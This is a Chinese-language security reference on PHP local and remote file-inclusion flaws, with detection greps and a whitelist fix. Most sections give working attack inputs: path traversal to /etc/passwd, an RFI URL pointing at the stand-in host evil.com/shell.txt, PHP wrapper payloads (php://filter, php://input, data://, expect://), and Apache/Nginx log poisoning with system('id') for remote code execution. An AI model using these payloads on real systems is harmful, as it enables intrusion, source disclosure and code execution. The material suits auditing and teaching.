# PHP 文件包含 (LFI/RFI)

## 确认条件

`include/require` 等函数的路径参数用户可控。

## 检测

```php
// LFI — 本地文件包含
include($_GET['page'] . '.php');
// ?page=../../etc/passwd%00 (PHP < 5.3.4)
// ?page=../../etc/passwd/././././. (路径截断绕过)

include("templates/" . $_GET['tpl']);
// ?tpl=../../etc/passwd

require_once($_GET['module'] . '/index.php');

// RFI — 远程文件包含
include($_GET['page']);
// 条件: allow_url_include=On
// ?page=http://evil.com/shell.txt

// Phar 反序列化
include('phar://uploads/shell.jpg');  // 触发 Phar 反序列化
```

## PHP Wrapper 利用

```
php://filter/convert.base64-encode/resource=config.php  → 读取源码(Base64)
php://filter/string.rot13/resource=index.php            → 读取源码(ROT13)
php://input                                               → POST BODY 作为PHP执行
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==    → 直接执行代码
expect://id                                               → 命令执行 (expect扩展)
phar://uploads/shell.jpg                                  → Phar反序列化
```

## 日志污染 → RCE

```
1. 污染 Apache 日志:
   GET /<?php system('id');?> HTTP/1.1
2. LFI 包含日志:
   ?page=/var/log/apache2/access.log
   ?page=/var/log/nginx/access.log
   ?page=/proc/self/environ (User-Agent注入)
```

## 修复

```php
$allowed = ['home', 'about', 'contact'];
$page = in_array($_GET['page'], $allowed) ? $_GET['page'] : 'home';
include("pages/{$page}.php");
```

## 检测命令

```bash
grep -rn "include(\|require(\|include_once(\|require_once(" --include="*.php" | grep '\$'
grep -rn "allow_url_include\|allow_url_fopen" --include="*.ini" --include="*.conf"
```
